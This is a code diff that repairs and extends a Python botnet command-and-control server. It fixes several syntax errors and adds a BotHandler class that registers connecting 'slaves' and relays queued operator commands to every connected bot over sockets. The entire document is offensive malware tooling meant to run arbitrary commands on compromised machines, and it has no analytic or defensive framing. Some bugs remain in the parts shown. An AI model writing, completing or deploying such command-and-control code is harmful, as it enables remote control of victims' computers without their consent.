@@ -5,13 +5,15 @@ import sys          # import system library for parsing arguments
 import os           # import os library to call exit and kill threads
 import threading    # import threading library to handle multiple connections
 import queue        # import queue library to handle threaded data
+import time
 
 q = queue.Queue()
 Socketthread = []
+ClientList = {}
 
-class BotCmd(threading.Thread);
+class BotCmd(threading.Thread):
     def __init__(self, qv2):
-        threading.Threadin.__init__(self)
+        threading.Thread.__init__(self)
         self.q = qv2
 
     def run(self):
@@ -26,10 +28,35 @@ class BotCmd(threading.Thread);
                 time.sleep(5)
                 os.exit(0)
             else:
-                print("[+] Sending Command: " + SendCmd + " to " + str(len(SocketThread)) + " bots\n")
+                print("[+] Sending Command: " + SendCmd + " to " + str(len(Socketthread)) + " bots\n")
                 for i in range(len(Socketthread)):
                     time.sleep(0.1)
                     self.q.put(SendCmd)
+
+class BotHandler(threading.Thread):
+    def __init__(self, client, client_address, qv):
+        threading.Thread.__init__(self)
+        self.client = client
+        self.client_address = client_address
+        self.ip = client_address[0]
+        self.port = client_address[1]
+        self.q = qv
+
+    def run(self):
+        BotName = threading.current_thread().getName()
+        print("[*] Slave " + self.ip + ":" + str(self.port) + " connected with Thread-ID: " + BotName)
+        
+        ClientList[BotName] = self.client_address
+
+        while True:
+            RecvBotCmd = self.q.get()
+            try:
+                RecvBotCmd += "\n"
+                self.client.send(RecvBotCmd.encode('utf-8'))
+            except Exception as ex:
+                print(ex)
+                break
+
 
 def listener(lhost, lport, q):
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -57,7 +84,7 @@ def main():
             lhost = sys.argv[1]
             lport = int(sys.argv[2])
             listener(lhost, lport, q)
-        except Exception e as ex:
+        except Exception as ex:
             print("\n[-] Unable to run the handler. Reason: " + str(ex) + "\n")
 
 if __name__ == '__main__':
